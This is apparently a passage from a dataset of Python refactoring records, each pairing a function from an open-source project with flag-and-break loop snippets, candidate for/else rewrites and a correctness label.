                    for pred in predInstances:
                        foundGt = False
                        for gt in pred[""matchedGt""]:
                            overlap = float(gt[""maskIntersection""]) / (
                                gt[""pixelCount""]
                                + pred[""pixelCount""]
                                - gt[""maskIntersection""]
                            )
                            if overlap > overlapTh:
                                foundGt = True
                                break
                        if not foundGt:
                            # collect number of void and *group pixels
                            nbIgnorePixels = 0
                            for gt in pred[""matchedGt""]:
                                # small ground truth instances
                                if gt[""pixelCount""] < minRegionSize:
                                    nbIgnorePixels += gt[""maskIntersection""]

                            if pred[""pixelCount""] <= 0:
                                proportionIgnore = 0
                            else:
                                proportionIgnore = (
                                    float(nbIgnorePixels) / pred[""pixelCount""]
                                )
                            # if not ignored
                            # append false positive
                            if proportionIgnore <= overlapTh:
                                curTrue = np.append(curTrue, 0)
                                confidence = pred[""confidence""]
                                curScore = np.append(curScore, confidence)

                    # append to overall results
                    y_true = np.append(y_true, curTrue)
                    y_score = np.append(y_score, curScore)

                # compute the average precision
                if haveGt and havePred:
                    # compute precision recall curve first

                    # sorting and cumsum
                    scoreArgSort = np.argsort(y_score)
                    yScoreSorted = y_score[scoreArgSort]
                    yTrueSorted = y_true[scoreArgSort]
                    yTrueSortedCumsum = np.cumsum(yTrueSorted)

                    # unique thresholds
                    (thresholds, uniqueIndices) = np.unique(
                        yScoreSorted, return_index=True
                    )

                    # since we need to add an artificial point to the precision-recall curve
                    # increase its length by 1
                    nbPrecRecall = len(uniqueIndices) + 1

                    # prepare precision recall
                    nbExamples = len(yScoreSorted)
                    nbTrueExamples = yTrueSortedCumsum[-1]
                    precision = np.zeros(nbPrecRecall)
                    recall = np.zeros(nbPrecRecall)

                    # deal with the first point
                    # only thing we need to do, is to append a zero to the cumsum at the end.
                    # an index of -1 uses that zero then
                    yTrueSortedCumsum = np.append(yTrueSortedCumsum, 0)

                    # deal with remaining
                    for idxRes, idxScores in enumerate(uniqueIndices):
                        cumSum = yTrueSortedCumsum[idxScores - 1]
                        tp = nbTrueExamples - cumSum
                        fp = nbExamples - idxScores - tp
                        fn = cumSum + hardFns
                        p = float(tp) / (tp + fp)
                        r = float(tp) / (tp + fn)
                        precision[idxRes] = p
                        recall[idxRes] = r

                    # first point in curve is artificial
                    precision[-1] = 1.0
                    recall[-1] = 0.0

                    # compute average of precision-recall curve
                    # integration is performed via zero order, or equivalently step-wise integration
                    # first compute the widths of each step:
                    # use a convolution with appropriate kernel, manually deal with the boundaries first
                    recallForConv = np.copy(recall)
                    recallForConv = np.append(recallForConv[0], recallForConv)
                    recallForConv = np.append(recallForConv, 0.0)

                    stepWidths = np.convolve(recallForConv, [-0.5, 0, 0.5], ""valid"")

                    # integrate is now simply a dot product
                    apCurrent = np.dot(precision, stepWidths)

                elif haveGt:
                    apCurrent = 0.0
                else:
                    apCurrent = float(""nan"")
                ap[dI, lI, oI] = apCurrent

    return ap","for gt in pred['matchedGt']:
    overlap = float(gt['maskIntersection']) / (gt['pixelCount'] + pred['pixelCount'] - gt['maskIntersection'])
    if overlap > overlapTh:
        foundGt = True
        break
if not foundGt:
    nbIgnorePixels = 0
    for gt in pred['matchedGt']:
        if gt['pixelCount'] < minRegionSize:
            nbIgnorePixels += gt['maskIntersection']
    if pred['pixelCount'] <= 0:
        proportionIgnore = 0
    else:
        proportionIgnore = float(nbIgnorePixels) / pred['pixelCount']
    if proportionIgnore <= overlapTh:
        curTrue = np.append(curTrue, 0)
        confidence = pred['confidence']
        curScore = np.append(curScore, confidence)","for gt in pred['matchedGt']:
    overlap = float(gt['maskIntersection']) / (gt['pixelCount'] + pred['pixelCount'] - gt['maskIntersection'])
    if overlap > overlapTh:
        break
else:
    nbIgnorePixels = 0
    for gt in pred['matchedGt']:
        if gt['pixelCount'] < minRegionSize:
            nbIgnorePixels += gt['maskIntersection']
    if pred['pixelCount'] <= 0:
        proportionIgnore = 0
    else:
        proportionIgnore = float(nbIgnorePixels) / pred['pixelCount']
    if proportionIgnore <= overlapTh:
        curTrue = np.append(curTrue, 0)
        confidence = pred['confidence']
        curScore = np.append(curScore, confidence)","for gt in pred['matchedGt']:
    overlap = float(gt['maskIntersection']) / (gt['pixelCount'] + pred['pixelCount'] - gt['maskIntersection'])
    if overlap > overlapTh:
        break
else:
    nbIgnorePixels = 0
    for gt in pred['matchedGt']:
        if gt['pixelCount'] < minRegionSize:
            nbIgnorePixels += gt['maskIntersection']
    if pred['pixelCount'] <= 0:
        proportionIgnore = 0
    else:
        proportionIgnore = float(nbIgnorePixels) / pred['pixelCount']
    if proportionIgnore <= overlapTh:
        curTrue = np.append(curTrue, 0)
        confidence = pred['confidence']
        curScore = np.append(curScore, confidence)",1,"for gt in pred['matchedGt']:
    overlap = float(gt['maskIntersection']) / (gt['pixelCount'] + pred['pixelCount'] - gt['maskIntersection'])
    if overlap > overlapTh:
        foundGt = True
        break
if not foundGt:
    nbIgnorePixels = 0
    for gt in pred['matchedGt']:
        if gt['pixelCount'] < minRegionSize:
            nbIgnorePixels += gt['maskIntersection']
    if pred['pixelCount'] <= 0:
        proportionIgnore = 0
    else:
        proportionIgnore = float(nbIgnorePixels) / pred['pixelCount']
    if proportionIgnore <= overlapTh:
        curTrue = np.append(curTrue, 0)
        confidence = pred['confidence']
        curScore = np.append(curScore, confidence)","break statement is executed:None
break statement is not executed:zejun1"
udocker,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/udocker/tests/unit/test_fileutil.py,https://github.com/indigo-dc/udocker/tree/master/tests/unit/test_fileutil.py,,find_str$19,"def find_str(self, find_exp, where):
    """"""Find string in test output messages.""""""
    found = False
    for item in where:
        if find_exp in str(item):
            self.assertTrue(True)
            found = True
            break
    if not found:
        self.assertTrue(False)","for item in where:
    if find_exp in str(item):
        self.assertTrue(True)
        found = True
        break
if not found:
    self.assertTrue(False)","for item in where:
    if find_exp in str(item):
        self.assertTrue(True)
        break
else:
    self.assertTrue(False)","for item in where:
    if find_exp in str(item):
        self.assertTrue(True)
        break
else:
    self.assertTrue(False)",1,"for item in where:
    if find_exp in str(item):
        self.assertTrue(True)
        found = True
        break
if not found:
    self.assertTrue(False)","break statement is executed:None
break statement is not executed:zejun1"
unknown-horizons,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/unknown-horizons/horizons/ai/aiplayer/productionbuilder.py,https://github.com/unknown-horizons/unknown-horizons/tree/master/horizons/ai/aiplayer/productionbuilder.py,ProductionBuilder,_handle_farm_removal$395,"def _handle_farm_removal(self, building):
		""""""Handle farm removal by removing planned fields and tearing existing ones that can't be serviced by another farm.""""""
		unused_fields = set()
		farms = self.settlement.buildings_by_id.get(BUILDINGS.FARM, [])
		for coords in building.position.get_radius_coordinates(building.radius):
			if coords not in self.plan:
				continue
			object = self.island.ground_map[coords].object
			if object is None or object.id not in self.field_building_classes:
				continue

			used_by_another_farm = False
			for farm in farms:
				if farm.worldid != building.worldid and object.position.distance(farm.position) <= farm.radius:
					used_by_another_farm = True
					break
			if not used_by_another_farm:
				unused_fields.add(object)

		# tear the finished but no longer used fields down
		for unused_field in unused_fields:
			self.register_change_list(list(unused_field.position.tuple_iter()), BUILDING_PURPOSE.NONE, None)
			Tear(unused_field).execute(self.session)

		# remove the planned but never built fields from the plan
		self._refresh_unused_fields()
		for unused_fields_list in self.unused_fields.values():
			for coords in unused_fields_list:
				position = Rect.init_from_topleft_and_size_tuples(coords, Entities.buildings[BUILDINGS.POTATO_FIELD].size)
				if building.position.distance(position) > building.radius:
					continue # it never belonged to the removed building

				used_by_another_farm = False
				for farm in farms:
					if farm.worldid != building.worldid and position.distance(farm.position) <= farm.radius:
						used_by_another_farm = True
						break
				if not used_by_another_farm:
					self.register_change_list(list(position.tuple_iter()), BUILDING_PURPOSE.NONE, None)
		self._refresh_unused_fields()","for farm in farms:
    if farm.worldid != building.worldid and object.position.distance(farm.position) <= farm.radius:
        used_by_another_farm = True
        break
if not used_by_another_farm:
    unused_fields.add(object)","for farm in farms:
    if farm.worldid != building.worldid and object.position.distance(farm.position) <= farm.radius:
        used_by_another_farm = True
        break
else:
    unused_fields.add(object)","for farm in farms:
    if farm.worldid != building.worldid and object.position.distance(farm.position) <= farm.radius:
        break
else:
    unused_fields.add(object)",0,"for farm in farms:
    if farm.worldid != building.worldid and object.position.distance(farm.position) <= farm.radius:
        used_by_another_farm = True
        break
if not used_by_another_farm:
    unused_fields.add(object)","break statement is executed:None
break statement is not executed:zejun1"
unknown-horizons,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/unknown-horizons/horizons/ai/aiplayer/productionbuilder.py,https://github.com/unknown-horizons/unknown-horizons/tree/master/horizons/ai/aiplayer/productionbuilder.py,ProductionBuilder,_handle_farm_removal$395,"def _handle_farm_removal(self, building):
		""""""Handle farm removal by removing planned fields and tearing existing ones that can't be serviced by another farm.""""""
		unused_fields = set()
		farms = self.settlement.buildings_by_id.get(BUILDINGS.FARM, [])
		for coords in building.position.get_radius_coordinates(building.radius):
			if coords not in self.plan:
				continue
			object = self.island.ground_map[coords].object
			if object is None or object.id not in self.field_building_classes:
				continue

			used_by_another_farm = False
			for farm in farms:
				if farm.worldid != building.worldid and object.position.distance(farm.position) <= farm.radius:
					used_by_another_farm = True
					break
			if not used_by_another_farm:
				unused_fields.add(object)

		# tear the finished but no longer used fields down
		for unused_field in unused_fields:
			self.register_change_list(list(unused_field.position.tuple_iter()), BUILDING_PURPOSE.NONE, None)
			Tear(unused_field).execute(self.session)

		# remove the planned but never built fields from the plan
		self._refresh_unused_fields()
		for unused_fields_list in self.unused_fields.values():
			for coords in unused_fields_list:
				position = Rect.init_from_topleft_and_size_tuples(coords, Entities.buildings[BUILDINGS.POTATO_FIELD].size)
				if building.position.distance(position) > building.radius:
					continue # it never belonged to the removed building

				used_by_another_farm = False
				for farm in farms:
					if farm.worldid != building.worldid and position.distance(farm.position) <= farm.radius:
						used_by_another_farm = True
						break
				if not used_by_another_farm:
					self.register_change_list(list(position.tuple_iter()), BUILDING_PURPOSE.NONE, None)
		self._refresh_unused_fields()","for farm in farms:
    if farm.worldid != building.worldid and position.distance(farm.position) <= farm.radius:
        used_by_another_farm = True
        break
if not used_by_another_farm:
    self.register_change_list(list(position.tuple_iter()), BUILDING_PURPOSE.NONE, None)","for farm in farms:
    if farm.worldid != building.worldid and position.distance(farm.position) <= farm.radius:
        break
else:
    self.register_change_list(list(position.tuple_iter()), BUILDING_PURPOSE.NONE, None)","for farm in farms:
    if farm.worldid != building.worldid and position.distance(farm.position) <= farm.radius:
        break
else:
    self.register_change_list(list(position.tuple_iter()), BUILDING_PURPOSE.NONE, None)",1,"for farm in farms:
    if farm.worldid != building.worldid and position.distance(farm.position) <= farm.radius:
        used_by_another_farm = True
        break
if not used_by_another_farm:
    self.register_change_list(list(position.tuple_iter()), BUILDING_PURPOSE.NONE, None)","break statement is executed:None
break statement is not executed:zejun1"
rockstor-core,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/rockstor-core/src/rockstor/system/pinmanager.py,https://github.com/rockstor/rockstor-core/tree/master/src/rockstor/system/pinmanager.py,,reset_password$29,"def reset_password(uname, uid, pinlist):

    pass_change_enabled = True

    # Loop through pinlist, get md5 digest of every pin and
    # and compare with Pincard model values
    for pin_index, pin_value in pinlist.items():

        pin_value_md5 = md5(pin_value).hexdigest()
        if (
            not Pincard.objects.filter(user=int(uid))
            .filter(pin_number=int(pin_index))
            .filter(pin_code=pin_value_md5)
            .exists()
        ):

            pass_change_enabled = False
            break

    if pass_change_enabled:

        # Generate new 8 chars random password
        new_password = """".join(
            random.choice(string.letters + string.digits) for _ in range(8)
        )
        # Reset system password
        usermod(uname, new_password)

        # If user is a managed one we have to reset smb pass too
        if User.objects.filter(username=uname).exists():
            smbpasswd(uname, new_password)
        # If user is a Django user reset pass
        if DjangoUser.objects.filter(username=uname).exists():
            duser = DjangoUser.objects.get(username=uname)
            duser.set_password(new_password)
            duser.save()

        password_message = (
            ""Password reset succeeded. New current password ""
            ""is {}"".format(new_password)
        )
        password_status = True

    else:

        password_message = ""At least one pin was wrong, password reset failed""
        password_status = False

    return password_message, password_status","for (pin_index, pin_value) in pinlist.items():
    pin_value_md5 = md5(pin_value).hexdigest()
    if not Pincard.objects.filter(user=int(uid)).filter(pin_number=int(pin_index)).filter(pin_code=pin_value_md5).exists():
        pass_change_enabled = False
        break
if pass_change_enabled:
    new_password = ''.join((random.choice(string.letters + string.digits) for _ in range(8)))
    usermod(uname, new_password)
    if User.objects.filter(username=uname).exists():
        smbpasswd(uname, new_password)
    if DjangoUser.objects.filter(username=uname).exists():
        duser = DjangoUser.objects.get(username=uname)
        duser.set_password(new_password)
        duser.save()
    password_message = 'Password reset succeeded. New current password is {}'.format(new_password)
    password_status = True
else:
    password_message = 'At least one pin was wrong, password reset failed'
    password_status = False","for (pin_index, pin_value) in pinlist.items():
    pin_value_md5 = md5(pin_value).hexdigest()
    if not Pincard.objects.filter(user=int(uid)).filter(pin_number=int(pin_index)).filter(pin_code=pin_value_md5).exists():
        password_message = 'At least one pin was wrong, password reset failed'
        password_status = False
        break
else:
    new_password = ''.join((random.choice(string.letters + string.digits) for _ in range(8)))
    usermod(uname, new_password)
    if User.objects.filter(username=uname).exists():
        smbpasswd(uname, new_password)
    if DjangoUser.objects.filter(username=uname).exists():
        duser = DjangoUser.objects.get(username=uname)
        duser.set_password(new_password)
        duser.save()
    password_message = 'Password reset succeeded. New current password is {}'.format(new_password)
    password_status = True","for (pin_index, pin_value) in pinlist.items():
    pin_value_md5 = md5(pin_value).hexdigest()
    if not Pincard.objects.filter(user=int(uid)).filter(pin_number=int(pin_index)).filter(pin_code=pin_value_md5).exists():
        password_message = 'At least one pin was wrong, password reset failed'
        password_status = False
        break
else:
    new_password = ''.join((random.choice(string.letters + string.digits) for _ in range(8)))
    usermod(uname, new_password)
    if User.objects.filter(username=uname).exists():
        smbpasswd(uname, new_password)
    if DjangoUser.objects.filter(username=uname).exists():
        duser = DjangoUser.objects.get(username=uname)
        duser.set_password(new_password)
        duser.save()
    password_message = 'Password reset succeeded. New current password is {}'.format(new_password)
    password_status = True",1,"for (pin_index, pin_value) in pinlist.items():
    pin_value_md5 = md5(pin_value).hexdigest()
    if not Pincard.objects.filter(user=int(uid)).filter(pin_number=int(pin_index)).filter(pin_code=pin_value_md5).exists():
        pass_change_enabled = False
        break
if pass_change_enabled:
    new_password = ''.join((random.choice(string.letters + string.digits) for _ in range(8)))
    usermod(uname, new_password)
    if User.objects.filter(username=uname).exists():
        smbpasswd(uname, new_password)
    if DjangoUser.objects.filter(username=uname).exists():
        duser = DjangoUser.objects.get(username=uname)
        duser.set_password(new_password)
        duser.save()
    password_message = 'Password reset succeeded. New current password is {}'.format(new_password)
    password_status = True
else:
    password_message = 'At least one pin was wrong, password reset failed'
    password_status = False","break statement is executed:None
break statement is not executed:zejun1"
policy_sentry,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/policy_sentry/policy_sentry/writing/minimize.py,https://github.com/salesforce/policy_sentry/tree/master/policy_sentry/writing/minimize.py,,minimize_statement_actions$89,"def minimize_statement_actions(
    desired_actions, all_actions, minchars=None
):  # pylint: disable=missing-function-docstring
    """"""
    This is a condensed version of policyuniverse's minimize_statement_actions, changed for our purposes.
    https://github.com/Netflix-Skunkworks/policyuniverse/blob/master/policyuniverse/expander_minimizer.py#L123
    """"""
    desired_actions = [x.lower() for x in desired_actions]
    minimized_actions = set()
    denied_prefixes = get_denied_prefixes_from_desired(desired_actions, all_actions)
    for action in desired_actions:
        if action in denied_prefixes:
            # print(""Action is a denied prefix. Action: {}"".format(action))
            minimized_actions.add(action)
            continue

        found_prefix = False
        prefixes = _get_prefixes_for_action(action)
        for prefix in prefixes:
            permission = prefix.split("":"")[1]
            if check_min_permission_length(permission, minchars=minchars):
                continue
            # If the action name is not empty
            if prefix not in denied_prefixes:
                if permission != """":
                    if prefix not in desired_actions:
                        prefix = ""{}*"".format(prefix)
                    minimized_actions.add(prefix)
                    found_prefix = True
                    break

        if not found_prefix:
            logger.debug(
                ""Could not suitable prefix. Defaulting to %s"".format(prefixes[-1])
            )
            minimized_actions.add(prefixes[-1])
    # sort the actions
    minimized_actions_list = sorted(minimized_actions)

    return minimized_actions_list","for prefix in prefixes:
    permission = prefix.split(':')[1]
    if check_min_permission_length(permission, minchars=minchars):
        continue
    if prefix not in denied_prefixes:
        if permission != '':
            if prefix not in desired_actions:
                prefix = '{}*'.format(prefix)
            minimized_actions.add(prefix)
            found_prefix = True
            break
if not found_prefix:
    logger.debug('Could not suitable prefix. Defaulting to %s'.format(prefixes[-1]))
    minimized_actions.add(prefixes[-1])","for prefix in prefixes:
    permission = prefix.split(':')[1]
    if check_min_permission_length(permission, minchars=minchars):
        continue
    if prefix not in denied_prefixes:
        if permission != '':
            if prefix not in desired_actions:
                prefix = '{}*'.format(prefix)
            minimized_actions.add(prefix)
            break
else:
    logger.debug('Could not suitable prefix. Defaulting to %s'.format(prefixes[-1]))
    minimized_actions.add(prefixes[-1])","for prefix in prefixes:
    permission = prefix.split(':')[1]
    if check_min_permission_length(permission, minchars=minchars):
        continue
    if prefix not in denied_prefixes:
        if permission != '':
            if prefix not in desired_actions:
                prefix = '{}*'.format(prefix)
            minimized_actions.add(prefix)
            break
else:
    logger.debug('Could not suitable prefix. Defaulting to %s'.format(prefixes[-1]))
    minimized_actions.add(prefixes[-1])",1,"for prefix in prefixes:
    permission = prefix.split(':')[1]
    if check_min_permission_length(permission, minchars=minchars):
        continue
    if prefix not in denied_prefixes:
        if permission != '':
            if prefix not in desired_actions:
                prefix = '{}*'.format(prefix)
            minimized_actions.add(prefix)
            found_prefix = True
            break
if not found_prefix:
    logger.debug('Could not suitable prefix. Defaulting to %s'.format(prefixes[-1]))
    minimized_actions.add(prefixes[-1])","break statement is executed:None
break statement is not executed:zejun1"
thonny,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/thonny/thonny/plugins/micropython/connection.py,https://github.com/thonny/thonny/tree/master/thonny/plugins/micropython/connection.py,MicroPythonConnection,read_until$62,"def read_until(self, terminator, timeout=1000000, timeout_is_soft=False):
        timer = TimeHelper(timeout)

        if isinstance(terminator, str):
            terminator = re.compile(re.escape(terminator))

        match = None
        while True:
            self._check_for_error()

            match = re.search(terminator, self._read_buffer)
            if match:
                break

            try:
                data = self._read_queue.get(True, timer.time_left)
                # print(""RR"", repr(data), file=sys.stderr)
                assert len(data) > 0
                self._read_buffer.extend(data)
            except queue.Empty:
                if timeout_is_soft:
                    break
                else:
                    raise TimeoutError(""Reaction timeout. Bytes read: %s"" % self._read_buffer)

        if match:
            size = match.end()
        else:
            assert timeout_is_soft
            size = len(self._read_buffer)

        data = self._read_buffer[:size]
        del self._read_buffer[:size]
        return data","while True:
    self._check_for_error()
    match = re.search(terminator, self._read_buffer)
    if match:
        break
    try:
        data = self._read_queue.get(True, timer.time_left)
        assert len(data) > 0
        self._read_buffer.extend(data)
    except queue.Empty:
        if timeout_is_soft:
            break
        else:
            raise TimeoutError('Reaction timeout. Bytes read: %s' % self._read_buffer)
if match:
    size = match.end()
else:
    assert timeout_is_soft
    size = len(self._read_buffer)","while True:
    self._check_for_error()
    match = re.search(terminator, self._read_buffer)
    if match:
        assert timeout_is_soft
        size = len(self._read_buffer)
        break
    try:
        data = self._read_queue.get(True, timer.time_left)
        assert len(data) > 0
        self._read_buffer.extend(data)
    except queue.Empty:
        if timeout_is_soft:
            assert timeout_is_soft
            size = len(self._read_buffer)
            break
        else:
            raise TimeoutError('Reaction timeout. Bytes read: %s' % self._read_buffer)
else:
    size = match.end()","while True:
    self._check_for_error()
    match = re.search(terminator, self._read_buffer)
    if match:
        size = match.end()
        break
    try:
        data = self._read_queue.get(True, timer.time_left)
        assert len(data) > 0
        self._read_buffer.extend(data)
    except queue.Empty:
        if timeout_is_soft:
            break
        else:
            raise TimeoutError('Reaction timeout. Bytes read: %s' % self._read_buffer)
else:
    assert timeout_is_soft
    size = len(self._read_buffer)",0,"while True:
    self._check_for_error()
    match = re.search(terminator, self._read_buffer)
    if match:
        break
    try:
        data = self._read_queue.get(True, timer.time_left)
        assert len(data) > 0
        self._read_buffer.extend(data)
    except queue.Empty:
        if timeout_is_soft:
            break
        else:
            raise TimeoutError('Reaction timeout. Bytes read: %s' % self._read_buffer)
if match:
    size = match.end()
else:
    assert timeout_is_soft
    size = len(self._read_buffer)","break statement is executed:None
break statement is not executed:zejun1"
coconut,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/coconut/coconut/compiler/util.py,https://github.com/evhub/coconut/tree/master/coconut/compiler/util.py,,any_len_perm_with_one_of_each_group$824,"def any_len_perm_with_one_of_each_group(*groups_and_elems):
    """"""Matches any len permutation of elems that contains at least one of each group.""""""
    elems = []
    groups = defaultdict(list)
    for item in groups_and_elems:
        if isinstance(item, tuple):
            g, e = item
        else:
            g, e = None, item
        elems.append(e)
        if g is not None:
            groups[g].append(e)

    out = None
    allow_none = False
    ordered_subsets = list(ordered_powerset(elems))
    # reverse to ensure that prefixes are matched last
    ordered_subsets.reverse()
    for ord_subset in ordered_subsets:
        allow = True
        for grp in groups.values():
            if not any(e in ord_subset for e in grp):
                allow = False
                break
        if allow:
            if ord_subset:
                ord_subset_item = reduce(lambda x, y: x + y, ord_subset)
                if out is None:
                    out = ord_subset_item
                else:
                    out |= ord_subset_item
            else:
                allow_none = True
    if allow_none:
        out = Optional(out)
    return out","for grp in groups.values():
    if not any((e in ord_subset for e in grp)):
        allow = False
        break
if allow:
    if ord_subset:
        ord_subset_item = reduce(lambda x, y: x + y, ord_subset)
        if out is None:
            out = ord_subset_item
        else:
            out |= ord_subset_item
    else:
        allow_none = True","for grp in groups.values():
    if not any((e in ord_subset for e in grp)):
        break
else:
    if ord_subset:
        ord_subset_item = reduce(lambda x, y: x + y, ord_subset)
        if out is None:
            out = ord_subset_item
        else:
            out |= ord_subset_item
    else:
        allow_none = True","for grp in groups.values():
    if not any((e in ord_subset for e in grp)):
        break
else:
    if ord_subset:
        ord_subset_item = reduce(lambda x, y: x + y, ord_subset)
        if out is None:
            out = ord_subset_item
        else:
            out |= ord_subset_item
    else:
        allow_none = True",1,"for grp in groups.values():
    if not any((e in ord_subset for e in grp)):
        allow = False
        break
if allow:
    if ord_subset:
        ord_subset_item = reduce(lambda x, y: x + y, ord_subset)
        if out is None:
            out = ord_subset_item
        else:
            out |= ord_subset_item
    else:
        allow_none = True","break statement is executed:None
break statement is not executed:zejun1"
nltk,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/nltk/nltk/stem/snowball.py,https://github.com/nltk/nltk/tree/master/nltk/stem/snowball.py,RussianStemmer,stem$4882,"def stem(self, word):
        """"""
        Stem a Russian word and return the stemmed form.

        :param word: The word that is stemmed.
        :type word: str or unicode
        :return: The stemmed form.
        :rtype: unicode

        """"""
        if word in self.stopwords:
            return word

        chr_exceeded = False
        for i in range(len(word)):
            if ord(word[i]) > 255:
                chr_exceeded = True
                break

        if not chr_exceeded:
            return word

        word = self.__cyrillic_to_roman(word)

        step1_success = False
        adjectival_removed = False
        verb_removed = False
        undouble_success = False
        superlative_removed = False

        rv, r2 = self.__regions_russian(word)

        # Step 1
        for suffix in self.__perfective_gerund_suffixes:
            if rv.endswith(suffix):
                if suffix in (""v"", ""vshi"", ""vshis'""):
                    if (
                        rv[-len(suffix) - 3 : -len(suffix)] == ""i^a""
                        or rv[-len(suffix) - 1 : -len(suffix)] == ""a""
                    ):
                        word = word[: -len(suffix)]
                        r2 = r2[: -len(suffix)]
                        rv = rv[: -len(suffix)]
                        step1_success = True
                        break
                else:
                    word = word[: -len(suffix)]
                    r2 = r2[: -len(suffix)]
                    rv = rv[: -len(suffix)]
                    step1_success = True
                    break

        if not step1_success:
            for suffix in self.__reflexive_suffixes:
                if rv.endswith(suffix):
                    word = word[: -len(suffix)]
                    r2 = r2[: -len(suffix)]
                    rv = rv[: -len(suffix)]
                    break

            for suffix in self.__adjectival_suffixes:
                if rv.endswith(suffix):
                    if suffix in (
                        ""i^ushchi^ui^u"",
                        ""i^ushchi^ai^a"",
                        ""i^ushchui^u"",
                        ""i^ushchai^a"",
                        ""i^ushchoi^u"",
                        ""i^ushchei^u"",
                        ""i^ushchimi"",
                        ""i^ushchymi"",
                        ""i^ushchego"",
                        ""i^ushchogo"",
                        ""i^ushchemu"",
                        ""i^ushchomu"",
                        ""i^ushchikh"",
                        ""i^ushchykh"",
                        ""shchi^ui^u"",
                        ""shchi^ai^a"",
                        ""i^ushchee"",
                        ""i^ushchie"",
                        ""i^ushchye"",
                        ""i^ushchoe"",
                        ""i^ushchei`"",
                        ""i^ushchii`"",
                        ""i^ushchyi`"",
                        ""i^ushchoi`"",
                        ""i^ushchem"",
                        ""i^ushchim"",
                        ""i^ushchym"",
                        ""i^ushchom"",
                        ""vshi^ui^u"",
                        ""vshi^ai^a"",
                        ""shchui^u"",
                        ""shchai^a"",
                        ""shchoi^u"",
                        ""shchei^u"",
                        ""emi^ui^u"",
                        ""emi^ai^a"",
                        ""nni^ui^u"",
                        ""nni^ai^a"",
                        ""shchimi"",
                        ""shchymi"",
                        ""shchego"",
                        ""shchogo"",
                        ""shchemu"",
                        ""shchomu"",
                        ""shchikh"",
                        ""shchykh"",
                        ""vshui^u"",
                        ""vshai^a"",
                        ""vshoi^u"",
                        ""vshei^u"",
                        ""shchee"",
                        ""shchie"",
                        ""shchye"",
                        ""shchoe"",
                        ""shchei`"",
                        ""shchii`"",
                        ""shchyi`"",
                        ""shchoi`"",
                        ""shchem"",
                        ""shchim"",
                        ""shchym"",
                        ""shchom"",
                        ""vshimi"",
                        ""vshymi"",
                        ""vshego"",
                        ""vshogo"",
                        ""vshemu"",
                        ""vshomu"",
                        ""vshikh"",
                        ""vshykh"",
                        ""emui^u"",
                        ""emai^a"",
                        ""emoi^u"",
                        ""emei^u"",
                        ""nnui^u"",
                        ""nnai^a"",
                        ""nnoi^u"",
                        ""nnei^u"",
                        ""vshee"",
                        ""vshie"",
                        ""vshye"",
                        ""vshoe"",
                        ""vshei`"",
                        ""vshii`"",
                        ""vshyi`"",
                        ""vshoi`"",
                        ""vshem"",
                        ""vshim"",
                        ""vshym"",
                        ""vshom"",
                        ""emimi"",
                        ""emymi"",
                        ""emego"",
                        ""emogo"",
                        ""ememu"",
                        ""emomu"",
                        ""emikh"",
                        ""emykh"",
                        ""nnimi"",
                        ""nnymi"",
                        ""nnego"",
                        ""nnogo"",
                        ""nnemu"",
                        ""nnomu"",
                        ""nnikh"",
                        ""nnykh"",
                        ""emee"",
                        ""emie"",
                        ""emye"",
                        ""emoe"",
                        ""emei`"",
                        ""emii`"",
                        ""emyi`"",
                        ""emoi`"",
                        ""emem"",
                        ""emim"",
                        ""emym"",
                        ""emom"",
                        ""nnee"",
                        ""nnie"",
                        ""nnye"",
                        ""nnoe"",
                        ""nnei`"",
                        ""nnii`"",
                        ""nnyi`"",
                        ""nnoi`"",
                        ""nnem"",
                        ""nnim"",
                        ""nnym"",
                        ""nnom"",
                    ):
                        if (
                            rv[-len(suffix) - 3 : -len(suffix)] == ""i^a""
                            or rv[-len(suffix) - 1 : -len(suffix)] == ""a""
                        ):
                            word = word[: -len(suffix)]
                            r2 = r2[: -len(suffix)]
                            rv = rv[: -len(suffix)]
                            adjectival_removed = True
                            break
                    else:
                        word = word[: -len(suffix)]
                        r2 = r2[: -len(suffix)]
                        rv = rv[: -len(suffix)]
                        adjectival_removed = True
                        break

            if not adjectival_removed:
                for suffix in self.__verb_suffixes:
                    if rv.endswith(suffix):
                        if suffix in (
                            ""la"",
                            ""na"",
                            ""ete"",
                            ""i`te"",
                            ""li"",
                            ""i`"",
                            ""l"",
                            ""em"",
                            ""n"",
                            ""lo"",
                            ""no"",
                            ""et"",
                            ""i^ut"",
                            ""ny"",
                            ""t'"",
                            ""esh'"",
                            ""nno"",
                        ):
                            if (
                                rv[-len(suffix) - 3 : -len(suffix)] == ""i^a""
                                or rv[-len(suffix) - 1 : -len(suffix)] == ""a""
                            ):
                                word = word[: -len(suffix)]
                                r2 = r2[: -len(suffix)]
                                rv = rv[: -len(suffix)]
                                verb_removed = True
                                break
                        else:
                            word = word[: -len(suffix)]
                            r2 = r2[: -len(suffix)]
                            rv = rv[: -len(suffix)]
                            verb_removed = True
                            break

            if not adjectival_removed and not verb_removed:
                for suffix in self.__noun_suffixes:
                    if rv.endswith(suffix):
                        word = word[: -len(suffix)]
                        r2 = r2[: -len(suffix)]
                        rv = rv[: -len(suffix)]
                        break

        # Step 2
        if rv.endswith(""i""):
            word = word[:-1]
            r2 = r2[:-1]

        # Step 3
        for suffix in self.__derivational_suffixes:
            if r2.endswith(suffix):
                word = word[: -len(suffix)]
                break

        # Step 4
        if word.endswith(""nn""):
            word = word[:-1]
            undouble_success = True

        if not undouble_success:
            for suffix in self.__superlative_suffixes:
                if word.endswith(suffix):
                    word = word[: -len(suffix)]
                    superlative_removed = True
                    break
            if word.endswith(""nn""):
                word = word[:-1]

        if not undouble_success and not superlative_removed:
            if word.endswith(""'""):
                word = word[:-1]

        word = self.__roman_to_cyrillic(word)

        return word","for i in range(len(word)):
    if ord(word[i]) > 255:
        chr_exceeded = True
        break
if not chr_exceeded:
    return word","for i in range(len(word)):
    if ord(word[i]) > 255:
        break
else:
    return word","for i in range(len(word)):
    if ord(word[i]) > 255:
        break
else:
    return word",1,"for i in range(len(word)):
    if ord(word[i]) > 255:
        chr_exceeded = True
        break
if not chr_exceeded:
    return word","break statement is executed:None
break statement is not executed:zejun1"
